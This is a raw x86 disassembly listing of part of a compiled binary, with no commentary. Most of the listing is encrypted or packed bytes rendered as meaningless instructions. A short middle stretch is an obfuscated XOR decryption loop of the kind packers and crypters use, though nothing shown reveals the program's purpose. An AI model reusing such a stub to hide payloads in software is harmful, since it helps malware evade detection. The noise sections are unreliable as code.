  403a79:	test   BYTE PTR [ecx+0x5f],0x8d
  403a7d:	div    BYTE PTR [esi*4-0x1c789d7c]
  403a84:	adc    ecx,DWORD PTR [eax-0x3d]
  403a87:	(bad)  
  403a88:	(bad)  
  403a89:	rcr    BYTE PTR [esi],1
  403a8b:	imul   ecx,DWORD PTR [esi-0x168fa92],0x7f
  403a92:	inc    edi
  403a93:	mov    ds:0x29e86dc3,eax
  403a98:	pop    edx
  403a99:	push   ds
  403a9a:	call   0x8782812c
  403a9f:	inc    ecx
  403aa0:	push   ss
  403aa1:	les    edx,FWORD PTR [esi]
  403aa3:	pop    esi
  403aa4:	scas   eax,DWORD PTR es:[edi]
  403aa5:	or     eax,0xe17a46ca
  403aaa:	dec    ebx
  403aab:	iret   
  403aac:	push   ebp
  403aad:	mov    dl,0x38
  403aaf:	retf   0xec13
  403ab2:	adc    esi,DWORD PTR [edx+0x1c]
  403ab5:	in     eax,dx
  403ab6:	jmp    0x403a60
  403ab8:	inc    ebp
  403ab9:	shl    BYTE PTR [ecx-0x54],cl
  403abc:	mov    cl,0x8d
  403abe:	xor    ch,BYTE PTR [eax]
  403ac0:	and    BYTE PTR [edi-0x38cdee27],0xe
  403ac7:	iret   
  403ac8:	and    eax,0x3989fd5d
  403acd:	lods   eax,DWORD PTR ds:[esi]
  403ace:	imul   si,WORD PTR [edx-0x19b998ee],0x4d
  403ad6:	sahf   
  403ad7:	sahf   
  403ad8:	lods   al,BYTE PTR ds:[esi]
  403ad9:	adc    edx,DWORD PTR [esi+0x58]
  403adc:	call   0xc985ab6f
  403ae1:	inc    ebp
  403ae2:	inc    edi
  403ae3:	adc    BYTE PTR [ebx+0x6],ch
  403ae6:	push   edx
  403ae7:	imul   ebx,DWORD PTR [edi],0x1e
  403aea:	aas    
  403aeb:	mov    DWORD PTR [ecx+0x61],ebp
  403aee:	test   eax,0x3d4d0acf
  403af3:	xchg   ebx,eax
  403af4:	mov    ?,WORD PTR [ecx-0x59]
  403af7:	cdq    
  403af8:	dec    eax
  403af9:	sub    edi,DWORD PTR [edx+0x2d]
  403afc:	xor    DWORD PTR [esi],ecx
  403afe:	push   0x6b
  403b00:	and    BYTE PTR [eax+0xf],dl
  403b03:	push   ss
  403b04:	mov    ebx,0xc69a0e08
  403b09:	std    
  403b0a:	push   ss
  403b0b:	add    eax,eax
  403b0d:	xor    DWORD PTR [edx-0x31],0xffffffb0
  403b11:	fstp   st(7)
  403b13:	inc    edx
  403b14:	dec    ebp
  403b15:	pop    edi
  403b16:	xchg   esi,eax
  403b17:	pushf  
  403b18:	fstp   DWORD PTR [eax]
  403b1a:	mov    al,BYTE PTR [eax+0x18f5ea35]
  403b20:	stos   BYTE PTR es:[edi],al
  403b21:	fiadd  WORD PTR [esi+0x50]
  403b24:	push   ds
  403b25:	fdivr  DWORD PTR [esi+0x61cd901c]
  403b2b:	xor    eax,0x626b7f83
  403b30:	in     eax,dx
  403b31:	dec    esi
  403b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b33:	es push esi
  403b35:	ror    edx,0xbb
  403b38:	gs jbe 0x403b3b
  403b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b3c:	mov    ebx,0x4f79f9a9
  403b41:	mov    al,ds:0x5437ddd6
  403b46:	push   ecx
  403b47:	dec    esi
  403b48:	push   edx
  403b49:	shl    DWORD PTR [ecx+edx*2+0xf],cl
  403b4d:	lods   al,BYTE PTR ds:[esi]
  403b4e:	pop    ebx
  403b4f:	and    BYTE PTR ds:0x230c1ecd,dl
  403b55:	push   eax
  403b56:	push   eax
  403b57:	mov    ebp,0xf0cca8c4
  403b5c:	std    
  403b5d:	jp     0x403b23
  403b5f:	popa   
  403b60:	lds    ebx,FWORD PTR [esi]
  403b62:	frstor [edx+0x2757486a]
  403b68:	rcl    al,cl
  403b6a:	sbb    DWORD PTR [eax+0x39b2d192],edx
  403b70:	imul   esi,DWORD PTR [edx+esi*2-0x531d49a4],0xffffff92
  403b78:	push   esi
  403b79:	pop    ebx
  403b7a:	mov    dl,0x56
  403b7c:	(bad)  
  403b7e:	adc    BYTE PTR [esi],cl
  403b80:	sbb    al,0x98
  403b82:	fucom  st(1)
  403b84:	inc    esp
  403b85:	lea    edx,[esi-0x37]
  403b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b8a:	inc    esp
  403b8b:	or     DWORD PTR [edi+ecx*8-0x38d8a55b],edx
  403b92:	cmp    DWORD PTR [eax-0x51],edx
  403b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b96:	push   0x43f563a2
  403b9b:	dec    esi
  403b9c:	enter  0xbfdf,0x68
  403ba0:	retf   
  403ba1:	inc    ecx
  403ba2:	pop    ebp
  403ba3:	outs   dx,BYTE PTR ds:[esi]
  403ba4:	jo     0x403bd3
  403ba6:	ds ins BYTE PTR es:[edi],dx
  403ba8:	adc    BYTE PTR ds:0x8b2c8eb6,al
  403bae:	xor    edi,ebx
  403bb0:	jo     0x403b9d
  403bb2:	clc    
  403bb3:	out    dx,eax
  403bb4:	in     al,dx
  403bb5:	and    edi,ebx
  403bb7:	pop    eax
  403bb8:	lea    edx,[edx-0x5132aa4b]
  403bbe:	fmul   QWORD PTR [ebx+edi*8+0xa65c893]
  403bc5:	js     0x403bd4
  403bc7:	cld    
  403bc8:	xchg   ebp,eax
  403bc9:	(bad)  
  403bca:	adc    DWORD PTR [ecx-0x397fe729],edx
  403bd0:	mov    ss,WORD PTR [ecx-0x4373f804]
  403bd6:	adc    dl,BYTE PTR [edi+ecx*8-0x24]
  403bda:	xchg   edi,eax
  403bdb:	push   ebp
  403bdc:	not    bl
  403bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bdf:	dec    ecx
  403be0:	jecxz  0x403b65
  403be2:	inc    edi
  403be3:	out    dx,eax
  403be4:	imul   esi,DWORD PTR [edx+0x42],0x75
  403be8:	push   ebx
  403be9:	(bad)  
  403bea:	jne    0x403bd5
  403bec:	test   BYTE PTR [edi-0x51d1940b],ah
  403bf2:	fbld   TBYTE PTR [ebp-0x456f916c]
  403bf8:	scas   eax,DWORD PTR es:[edi]
  403bf9:	rol    ebx,0x2
  403bfc:	fstp   st(1)
  403bfe:	push   DWORD PTR [eax-0x5a]
  403c01:	and    BYTE PTR [edi],al
  403c03:	rol    DWORD PTR [edx-0x52],cl
  403c06:	inc    edi
  403c07:	int3   
  403c08:	loop   0x403c41
  403c0a:	(bad)  
  403c0b:	mov    al,ds:0x79a8d00c
  403c10:	or     bh,BYTE PTR [eax+0x3a]
  403c13:	fild   QWORD PTR [edx-0x21]
  403c16:	cmp    al,0x55
  403c18:	inc    ecx
  403c19:	aas    
  403c1a:	ja     0x403be3
  403c1c:	inc    ebp
  403c1d:	mov    esp,0xf89c85bc
  403c22:	mov    eax,DWORD PTR [ebp-0x38]
  403c25:	mov    edx,DWORD PTR [ebp-0x14]
  403c28:	xor    eax,esi
  403c2a:	add    eax,edi
  403c2c:	cmp    edx,eax
  403c2e:	je     0x40617c
  403c34:	mov    eax,DWORD PTR [ebp-0x20]
  403c37:	xor    eax,esi
  403c39:	mov    edx,0xffcd8d0b
  403c3e:	sub    edx,eax
  403c40:	add    edx,DWORD PTR [ebp-0x14]
  403c43:	mov    eax,DWORD PTR [ebp-0x20]
  403c46:	mov    ebx,DWORD PTR [ebp-0x10]
  403c49:	xor    eax,esi
  403c4b:	add    eax,edi
  403c4d:	imul   eax,ebx
  403c50:	cmp    eax,edx
  403c52:	ja     0x406179
  403c58:	mov    edx,DWORD PTR [ebp-0x10]
  403c5b:	mov    eax,DWORD PTR [ebp-0x14]
  403c5e:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c61:	sub    eax,edx
  403c63:	xor    ebx,esi
  403c65:	xor    edx,edx
  403c67:	add    ebx,edi
  403c69:	div    ebx
  403c6b:	mov    DWORD PTR [ebp-0x8],eax
  403c6e:	mov    eax,DWORD PTR [ebp-0x44]
  403c71:	mov    edx,DWORD PTR [ebp-0x8]
  403c74:	xor    eax,esi
  403c76:	add    eax,edi
  403c78:	cmp    edx,eax
  403c7a:	jbe    0x403c8a
  403c80:	mov    eax,DWORD PTR [ebp-0x44]
  403c83:	xor    eax,esi
  403c85:	add    eax,edi
  403c87:	mov    DWORD PTR [ebp-0x8],eax
  403c8a:	mov    eax,DWORD PTR [ebp-0x2c]
  403c8d:	mov    edx,DWORD PTR [ebp-0x8]
  403c90:	xor    eax,esi
  403c92:	add    eax,edi
  403c94:	imul   eax,edx
  403c97:	mov    DWORD PTR [ebp-0x8],eax
  403c9a:	mov    eax,DWORD PTR [ebp-0x38]
  403c9d:	mov    edx,DWORD PTR [ebp-0x8]
  403ca0:	xor    eax,esi
  403ca2:	add    eax,edi
  403ca4:	cmp    edx,eax
  403ca6:	je     0x406162
  403cac:	mov    eax,DWORD PTR [ebp-0x8]
  403caf:	mov    DWORD PTR [ebp-0x18],eax
  403cb2:	mov    eax,DWORD PTR [ebp-0x10]
  403cb5:	add    eax,DWORD PTR [ebp-0x54]
  403cb8:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403cbf:	mov    DWORD PTR [ebp-0x8],eax
  403cc2:	mov    eax,0xf89c85a2
  403cc7:	mov    DWORD PTR [ebp-0x28],eax
  403cca:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cd1:	mov    DWORD PTR [ebp-0x40],0xf89c85a0
  403cd8:	mov    DWORD PTR [ebp-0x30],eax
  403cdb:	mov    eax,DWORD PTR [ebp-0x1c]
  403cde:	xor    eax,esi
  403ce0:	add    eax,edi
  403ce2:	jmp    0x40611e
  403ce7:	mov    DWORD PTR [ebp-0x4c],0xf89c85b8
  403cee:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cf5:	mov    eax,DWORD PTR [ebp-0x30]
  403cf8:	mov    edx,DWORD PTR [ebp-0xc]
  403cfb:	xor    eax,esi
  403cfd:	add    eax,edi
  403cff:	imul   eax,edx
  403d02:	mov    edx,DWORD PTR [ebp-0x8]
  403d05:	mov    al,BYTE PTR [eax+edx*1]
  403d08:	mov    BYTE PTR [ebp-0x1],al
  403d0b:	mov    eax,DWORD PTR [ebp-0x30]
  403d0e:	mov    edx,DWORD PTR [ebp-0xc]
  403d11:	xor    eax,esi
  403d13:	add    eax,edi
  403d15:	imul   eax,edx
  403d18:	mov    edx,DWORD PTR [ebp-0x5c]
  403d1b:	xor    edx,esi
  403d1d:	add    eax,edx
  403d1f:	mov    edx,DWORD PTR [ebp-0x8]
  403d22:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d2a:	mov    edx,DWORD PTR [ebp-0x4c]
  403d2d:	xor    edx,esi
  403d2f:	lea    eax,[edx+eax*1+0x3272f5]
  403d36:	movzx  edx,BYTE PTR [ebp-0x1]
  403d3a:	xor    edx,eax
  403d3c:	mov    BYTE PTR [ebp-0x1],dl
  403d3f:	mov    al,BYTE PTR [ebp-0x1]
  403d42:	mov    edx,DWORD PTR [ebp-0x30]
  403d45:	mov    ebx,DWORD PTR [ebp-0xc]
  403d48:	xor    edx,esi
  403d4a:	add    edx,edi
  403d4c:	imul   edx,ebx
  403d4f:	mov    ebx,DWORD PTR [ebp-0x8]
  403d52:	mov    BYTE PTR [edx+ebx*1],al
  403d55:	mov    eax,DWORD PTR [ebp-0x30]
  403d58:	mov    edx,DWORD PTR [ebp-0xc]
  403d5b:	xor    eax,esi
  403d5d:	add    eax,edi
  403d5f:	imul   eax,edx
  403d62:	mov    edx,DWORD PTR [ebp-0x8]
  403d65:	mov    al,BYTE PTR [eax+edx*1]
  403d68:	mov    BYTE PTR [ebp-0x1],al
  403d6b:	mov    eax,DWORD PTR [ebp-0x30]
  403d6e:	mov    edx,DWORD PTR [ebp-0xc]
  403d71:	xor    eax,esi
  403d73:	add    eax,edi
  403d75:	imul   eax,edx
  403d78:	mov    edx,DWORD PTR [ebp-0x28]
  403d7b:	xor    edx,esi
  403d7d:	add    eax,edx
  403d7f:	mov    edx,DWORD PTR [ebp-0x8]
  403d82:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d8a:	mov    edx,DWORD PTR [ebp-0x50]
  403d8d:	xor    edx,esi
  403d8f:	lea    eax,[edx+eax*1+0x3272f5]
  403d96:	movzx  edx,BYTE PTR [ebp-0x1]
  403d9a:	xor    edx,eax
  403d9c:	mov    BYTE PTR [ebp-0x1],dl
  403d9f:	mov    al,BYTE PTR [ebp-0x1]
  403da2:	mov    edx,DWORD PTR [ebp-0x30]
  403da5:	mov    ebx,DWORD PTR [ebp-0xc]
  403da8:	xor    edx,esi
  403daa:	add    edx,edi
  403dac:	imul   edx,ebx
  403daf:	mov    ebx,DWORD PTR [ebp-0x8]
  403db2:	jmp    0x406107
  403db7:	dec    ebx
  403db8:	inc    eax
  403db9:	sub    eax,0xc4820296
  403dbe:	scas   al,BYTE PTR es:[edi]
  403dbf:	push   0x8cdd8915
  403dc4:	and    al,0x91
  403dc6:	push   0x83835e4b
  403dcb:	dec    ebx
  403dcc:	pop    esi
  403dcd:	add    DWORD PTR [ebx+0x4992caba],0x1e
  403dd4:	sahf   
  403dd5:	dec    eax
  403dd6:	outs   dx,DWORD PTR ds:[esi]
  403dd7:	sbb    DWORD PTR [ebx+0xa071b47],edx
  403ddd:	inc    esp
  403dde:	or     DWORD PTR [edi],ecx
  403de0:	sar    DWORD PTR [edx+0x3555cd08],0xf8
  403de7:	pop    eax
  403de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403de9:	je     0x403dca
  403deb:	mov    dh,0xb8
  403ded:	mov    eax,0x50150fbe
  403df2:	scas   al,BYTE PTR es:[edi]
  403df3:	loope  0x403da8
  403df5:	inc    edx
  403df6:	or     eax,0x7aab62d2
  403dfb:	mov    ds:0xb7fb7294,eax
  403e00:	and    bh,BYTE PTR cs:[ecx]
  403e03:	mov    edx,0x2bfdb817
  403e08:	in     eax,dx
  403e09:	test   eax,0x194c7e41
  403e0e:	jns    0x403da0
  403e10:	fdivrp st(6),st
  403e12:	lods   eax,DWORD PTR ds:[esi]
  403e13:	xor    DWORD PTR [edi],0xffffffc8
  403e16:	jnp    0x403ddd
  403e18:	pop    edi
  403e19:	mov    al,ds:0xbe437ffe
  403e1e:	shl    DWORD PTR [eax-0x64bc7afc],0x23
  403e25:	pop    edi
  403e26:	in     eax,dx
  403e27:	lock call 0xa307:0x766a434
  403e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e30:	dec    esp
  403e31:	test   BYTE PTR [eax+eiz*8],al
  403e34:	shl    BYTE PTR [edi+esi*8+0x16d9a1ad],1
  403e3b:	jnp    0x403e86
  403e3d:	fwait
  403e3e:	or     BYTE PTR [ebx+edx*1],al
  403e41:	pop    ds
  403e42:	adc    eax,0x4f29a2a5
  403e47:	loop   0x403dce
  403e49:	daa    
  403e4a:	outs   dx,BYTE PTR ds:[esi]
  403e4b:	xchg   edi,eax
  403e4c:	call   0x3d77:0xae416c16
  403e53:	(bad)  
  403e54:	mov    eax,ds:0x1d96957a
  403e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e5a:	jge    0x403e5a
  403e5c:	xchg   edx,eax
  403e5d:	loopne 0x403e23
  403e5f:	mov    edx,0x68165988
  403e64:	rol    BYTE PTR [ebp+ebp*4-0x2a],1
  403e68:	jmp    0x8a795197
  403e6d:	or     edi,0x42
  403e70:	sbb    bl,BYTE PTR [ecx-0x5befc5cd]
  403e76:	arpl   bx,dx
  403e78:	sbb    al,0x55
  403e7a:	aam    0x2f
  403e7c:	push   0x21
  403e7e:	ja     0x403e67
  403e80:	test   eax,0x454d3d0a
  403e85:	fwait
  403e86:	hlt    
  403e87:	into   
  403e88:	mov    ebp,0x2ab47704
  403e8d:	adc    DWORD PTR [edx-0x1b0d5a8b],ebx
  403e93:	pop    ecx
  403e94:	or     al,0x83
  403e96:	in     eax,dx
  403e97:	fimul  WORD PTR [edi+0x43]
  403e9a:	mov    ah,0x4e
  403e9c:	lds    esi,FWORD PTR [ecx+ecx*4-0x5a]
  403ea0:	test   al,0xa1
  403ea2:	or     bh,al
  403ea4:	fxch   st(5)
  403ea6:	push   eax
  403ea7:	mov    ds:0xcc02c1d9,al
  403eac:	cmp    al,0x21
  403eae:	cmp    dl,BYTE PTR [edx]
  403eb0:	push   0x3
  403eb2:	pop    edi
  403eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eb4:	mov    BYTE PTR [edx+eiz*1+0x7f],dh
  403eb8:	popa   
  403eb9:	xor    BYTE PTR [esi],dh
  403ebb:	inc    eax
  403ebc:	cdq    
  403ebd:	cwde   
  403ebe:	shr    DWORD PTR [ebx],cl
  403ec0:	add    dl,dh
  403ec2:	add    edi,ebp
  403ec4:	mov    edi,0x57afa7f4
  403ec9:	push   ecx
  403eca:	jg     0x403f37
  403ecc:	cmp    edx,DWORD PTR ds:0x2b0c3bab
  403ed2:	jne    0x403ee1
  403ed4:	scas   eax,DWORD PTR es:[edi]
  403ed5:	sub    eax,0x2b2413fc
  403eda:	pop    es
  403edb:	cmp    ecx,ecx
  403edd:	and    cl,BYTE PTR [eax+ebx*1-0x21fb52a2]
  403ee4:	pop    eax
  403ee5:	add    DWORD PTR [ebx+0x32f9e9c2],0x1a
  403eec:	test   eax,0xf6519eb4
  403ef1:	mov    ch,0x73
  403ef3:	mov    esi,0x5bd765f3
  403ef8:	pop    edx
  403ef9:	cmp    al,0xe2
  403efb:	mov    edi,0x9bb73083
  403f00:	jns    0x403eab
  403f02:	clc    
  403f03:	cmp    eax,0x893e0106
  403f08:	mov    ebp,0xc6000527
  403f0d:	mov    ebp,?
  403f0f:	fwait
  403f10:	mov    al,0xff
  403f12:	stos   DWORD PTR es:[edi],eax
  403f13:	test   BYTE PTR [edi],0x43
  403f16:	inc    edi
  403f17:	call   0x2764:0xbc448062
  403f1e:	sub    DWORD PTR [ecx],ebp
  403f20:	xchg   esi,eax
  403f21:	xchg   ebx,eax
  403f22:	(bad)  
  403f23:	clc    
  403f24:	pop    ds
  403f25:	loop   0x403f68
  403f27:	and    esp,edi
  403f29:	shr    BYTE PTR [ecx+0xe],cl
  403f2c:	icebp  
  403f2d:	(bad)  
  403f2e:	test   BYTE PTR [eax-0x1c],ah
  403f31:	adc    eax,ecx
  403f33:	xchg   esp,eax
  403f34:	jl     0x403f95
  403f36:	jns    0x403f33
  403f38:	push   cs
  403f39:	mov    ebp,0xce2f0385
  403f3e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  403f40:	add    esp,DWORD PTR [ecx-0x18]
  403f43:	repz sub al,BYTE PTR [ebx-0x5e]
  403f47:	add    DWORD PTR [edi],esi
  403f49:	and    eax,0x3100d66
  403f4e:	fist   DWORD PTR [edx-0x28]
  403f51:	outs   dx,DWORD PTR ds:[esi]
  403f52:	in     al,dx
  403f53:	pop    ebx
  403f54:	sbb    eax,0x76990695
  403f59:	mov    edi,0x9a5faad1
  403f5e:	mov    eax,0xd4e9fed5
  403f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f64:	adc    al,0x23
  403f66:	push   0x36
  403f68:	lods   al,BYTE PTR ds:[esi]
  403f69:	add    ebx,esi
  403f6b:	mov    WORD PTR [edi],cs
  403f6d:	test   DWORD PTR [esi+ecx*4+0x78],ebx
  403f71:	xchg   ebp,eax
  403f72:	add    esp,ecx
  403f74:	jo     0x403f52
  403f76:	mov    ds:0xcd98483c,al
  403f7b:	mov    eax,ds:0xe91ef2a0
  403f80:	lock retf 
  403f82:	out    dx,al
  403f83:	arpl   WORD PTR [ecx-0xd],di
  403f86:	in     al,0xd9
  403f88:	jae    0x403fc0
  403f8a:	cmp    al,BYTE PTR [esp+eax*2]
  403f8d:	jecxz  0x403f12
  403f8f:	sbb    BYTE PTR [eax-0x389a35a0],dl
  403f95:	cmp    DWORD PTR [ecx],esp
  403f97:	cli    
  403f98:	inc    eax
  403f99:	mov    esi,0x9f881e54
  403f9e:	pop    ebx
  403f9f:	xor    al,0x9c
  403fa1:	pusha  
  403fa2:	(bad)  
  403fa3:	in     eax,0x72
  403fa5:	shr    DWORD PTR [esi+ebx*2-0x64],1
  403fa9:	stc    
  403faa:	imul   ecx,DWORD PTR [edx+0x1b],0x2f
  403fae:	mov    dh,0xdf
  403fb0:	enter  0x1e67,0x6e
  403fb4:	stos   BYTE PTR es:[edi],al
  403fb5:	scas   al,BYTE PTR es:[edi]
  403fb6:	mov    bh,0xd3
  403fb8:	sbb    BYTE PTR [edx-0x67eba0f8],0x75
  403fbf:	xchg   edi,eax
  403fc0:	pop    ecx
  403fc1:	push   ss
  403fc2:	imul   eax,DWORD PTR [ebx-0x2f00f970],0x2492adc2
  403fcc:	add    DWORD PTR [edi],0xc1ab4484
  403fd2:	les    ebx,FWORD PTR [edi+0x13]
  403fd5:	jb     0x40400c
  403fd7:	cli    
  403fd8:	xchg   DWORD PTR [esp+eax*8-0x3e],edi
  403fdc:	lea    edx,[esp+eax*8+0x570f5fd5]
  403fe3:	out    0x59,al
  403fe5:	stos   DWORD PTR es:[edi],eax
  403fe6:	cmp    ah,BYTE PTR [ecx+0x9]
  403fe9:	sub    BYTE PTR [eax-0x4ab7b462],0x79
  403ff0:	and    dl,BYTE PTR [esi+0x5905993a]
  403ff6:	mov    DWORD PTR [ecx],0xb5ae7805
  403ffc:	hlt    
  403ffd:	in     al,0xcb
  403fff:	(bad)  
  404000:	cmp    DWORD PTR [eax],ebx
  404002:	push   esi
  404003:	adc    al,0x36
  404005:	dec    esi
  404006:	lods   eax,DWORD PTR ds:[esi]
  404007:	lds    ebx,FWORD PTR [ecx]
  404009:	xchg   edi,eax
  40400a:	cmp    edi,DWORD PTR fs:[edi-0x42]
  40400e:	xchg   ebp,eax
  40400f:	test   eax,0x37fdc42f
  404014:	out    dx,eax
  404015:	sbb    ecx,DWORD PTR [esi+0x5c]
  404018:	ret    
  404019:	mov    esp,0x1f5cde1b
  40401e:	out    dx,eax
  40401f:	inc    ebp
  404020:	sub    eax,0x9fd0fa09
  404025:	mov    al,BYTE PTR [ecx]
  404027:	xchg   BYTE PTR [ebp+0x44],dl
  40402a:	imul   ecx,DWORD PTR ds:0x9bf5a70,0x39
  404031:	ins    BYTE PTR es:[edi],dx
  404032:	pushf  
  404033:	mov    bl,0xae
  404035:	sar    BYTE PTR [esi-0x34],0xfa
  404039:	xor    al,0x35
  40403b:	cli    
  40403c:	sub    ah,BYTE PTR [ebx+esi*1]
  40403f:	or     BYTE PTR [ebx],dh
  404041:	aam    0xa6
  404043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404044:	(bad)  
  404045:	and    ebx,edi
  404047:	xchg   esp,eax
  404048:	sub    DWORD PTR [ecx+0x1f1e1d52],ecx
  40404e:	test   eax,0x5368bec8
  404053:	outs   dx,DWORD PTR ds:[esi]
  404054:	stc    
  404055:	add    al,0xad
  404057:	into   
  404058:	fdiv   QWORD PTR [edi+0x7b39f0aa]
  40405e:	push   ss
  40405f:	inc    ebp
  404060:	dec    BYTE PTR [edx+0x7acd6fe3]
  404066:	or     BYTE PTR [eax],0xfa
  404069:	fs xchg esp,eax
  40406b:	fld    QWORD PTR ds:0x34d5015e
  404071:	dec    eax
  404072:	out    dx,al
  404073:	or     DWORD PTR [edx+eiz*8],0xffffffd7
  404077:	cmc    
  404078:	mov    BYTE PTR [ebp+0x2d6e554c],dl
  40407e:	mov    cl,0xc2
  404080:	mov    ecx,0x11ac14f2
  404085:	daa    
  404086:	out    dx,al
  404087:	jl     0x4040c8
  404089:	pop    edx
  40408a:	mov    ds:0x95a53767,al
  40408f:	xchg   DWORD PTR [edi],eax
  404091:	scas   al,BYTE PTR es:[edi]
  404092:	sar    DWORD PTR [edx-0x56267ab],1
  404098:	in     al,0x1d
  40409a:	dec    edi
  40409b:	hlt    
  40409c:	and    ebx,edx
  40409e:	iret   
  40409f:	loopne 0x4040ac
  4040a1:	mov    edi,0x9664ba5b
  4040a6:	mov    eax,0x76aedc20
  4040ab:	arpl   di,ax
  4040ad:	or     ah,BYTE PTR [edx]
  4040af:	jle    0x404051
  4040b1:	jl     0x4040e5
  4040b3:	pop    ecx
  4040b4:	je     0x404133
  4040b6:	lds    esi,FWORD PTR [ebx+0x2b]
  4040b9:	inc    edi
  4040ba:	xchg   esi,eax
  4040bb:	in     eax,dx
  4040bc:	inc    ecx
  4040bd:	bound  esp,QWORD PTR [eax]
  4040bf:	stc    
  4040c0:	push   eax
  4040c1:	pop    esi
  4040c2:	dec    edi
  4040c3:	unpckhps xmm2,XMMWORD PTR ds:0x90326b76
  4040ca:	das    
  4040cb:	pop    es
  4040cc:	cdq    
  4040cd:	jge    0x4040ac
  4040cf:	dec    ecx
  4040d0:	xor    BYTE PTR [ecx],cl
  4040d2:	jp     0x4040a6
  4040d4:	popa   
  4040d5:	popf   
  4040d6:	mov    ebp,0x8eb28a66
  4040db:	loop   0x40412d
  4040dd:	xchg   ebx,eax
  4040de:	push   ds
  4040df:	pusha  
  4040e0:	daa    
  4040e1:	fidivr DWORD PTR [ecx-0x3c8cab07]
  4040e7:	mov    ch,0x5c
  4040e9:	pushf  
  4040ea:	push   edx
  4040eb:	sub    cl,BYTE PTR [ebx+0x7393cc17]
  4040f1:	mov    ecx,0x77f8fa1c
  4040f6:	jo     0x4040a2
  4040f8:	shl    DWORD PTR [ebp+0x3e],1
  4040fb:	and    esp,DWORD PTR [edx]
  4040fd:	sti    
  4040fe:	(bad)  
  4040ff:	idiv   al
  404101:	or     ebp,DWORD PTR [edx+0x32e789ec]
  404107:	jecxz  0x404093
  404109:	in     al,0x7f
  40410b:	push   edi
  40410c:	cld    
  40410d:	mov    ebx,0xb9f43157
  404112:	inc    ecx
  404113:	fiadd  WORD PTR [edx-0xea1b9fe]
  404119:	sti    
  40411a:	or     DWORD PTR [ecx-0x58],0x70d4678d
  404121:	mov    dh,0xec
  404123:	fs pusha 
  404125:	fist   DWORD PTR [ecx]
  404127:	push   esi
  404128:	pop    eax
  404129:	or     bl,bl
  40412b:	sub    BYTE PTR [eax-0x47f2caac],dl
  404131:	(bad)  [eax+0x502e2527]
  404137:	(bad)  
  404138:	mov    ebp,0x1d9f5aab
  40413d:	add    BYTE PTR [eax+0x51],bl
  404140:	xchg   BYTE PTR [edx-0x1a870e05],al
  404146:	data16 test bh,ch
  404149:	js     0x40413e
  40414b:	bound  bx,DWORD PTR [eax]
  40414e:	or     eax,0x905f6fe0
  404153:	sbb    BYTE PTR [edi+0x58],dh
  404156:	add    al,0xd0
  404158:	mov    DWORD PTR [edi],ebp
  40415a:	sbb    bh,BYTE PTR [eax+ecx*4-0x5f]
  40415e:	sahf   
  40415f:	dec    esi
  404160:	test   al,0x9
  404162:	loope  0x40412e
  404164:	add    eax,0xf0001ed0
  404169:	icebp  
  40416a:	inc    esp
  40416b:	pop    edi
  40416c:	dec    ecx
  40416d:	push   0x50f669d2
  404172:	sbb    eax,0x65e23198
  404177:	push   0xffffffc1
  404179:	jae    0x40413c
  40417b:	sub    BYTE PTR [edi],cl
  40417d:	sbb    BYTE PTR [esi-0xe],cl
  404180:	jns    0x404179
  404182:	lds    esi,FWORD PTR [eax-0x2191ad3]
  404188:	mov    esp,DWORD PTR [ecx+eiz*4+0x9e4bc61]
  40418f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404190:	stc    
  404191:	loop   0x404172
  404193:	cmp    eax,eax
  404195:	lods   al,BYTE PTR ds:[esi]
  404196:	test   eax,0xda224a08
  40419b:	or     edx,DWORD PTR [eax+0x15fa7445]
  4041a1:	and    eax,0xdb2a0e3
  4041a6:	push   0xffffffdb
  4041a8:	mov    dl,0x4b
  4041aa:	mov    ch,0xfa
  4041ac:	aam    0x69
  4041ae:	fwait
  4041af:	mov    bh,0xdb
  4041b1:	jge    0x4041b0
  4041b3:	push   es
  4041b4:	rcr    BYTE PTR [esi],1
  4041b6:	mov    al,ds:0x795f3e27
  4041bb:	ins    DWORD PTR es:[edi],dx
  4041bc:	por    mm3,mm4
  4041bf:	jae    0x4041f6
  4041c1:	mov    ebp,?
  4041c3:	hlt    
  4041c4:	xchg   dl,ch
  4041c6:	pop    ss
  4041c7:	test   BYTE PTR [eax],ch
  4041c9:	aas    
  4041ca:	jnp    0x404237
  4041cc:	mov    ecx,0xb587a9e2
  4041d1:	xchg   BYTE PTR [esi+eiz*1-0xf003a8c],bl
  4041d8:	(bad)  
  4041d9:	jg     0x4041fe
  4041db:	push   ebp
  4041dc:	aam    0x93
  4041de:	jge    0x40416e
  4041e0:	cmp    DWORD PTR [eax],edi
  4041e2:	mov    ecx,0x133c8d9f
  4041e7:	rol    DWORD PTR ds:0x1a5a9fe6,0xbe
  4041ee:	cmp    ecx,edi
  4041f0:	lds    edi,FWORD PTR [edx+0x12]
  4041f3:	add    BYTE PTR [edx-0x7b850a61],0x14
  4041fa:	and    bh,BYTE PTR [edi+0x30]
  4041fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041fe:	int3   
  4041ff:	imul   ebx,DWORD PTR [edi-0x4088ae6f],0xffffffeb
  404206:	imul   DWORD PTR [esi]
  404208:	mov    ds:0xb6c15d71,al
  40420d:	scas   eax,DWORD PTR es:[edi]
  40420e:	sbb    eax,0x2be53c39
  404213:	cmp    al,0x76
  404215:	mov    ecx,0xeb6dfc27
  40421a:	aaa    
  40421b:	fstp   TBYTE PTR [eax-0x4e23839d]
  404221:	mov    dl,0x8d
  404223:	dec    ebx
  404224:	pop    es
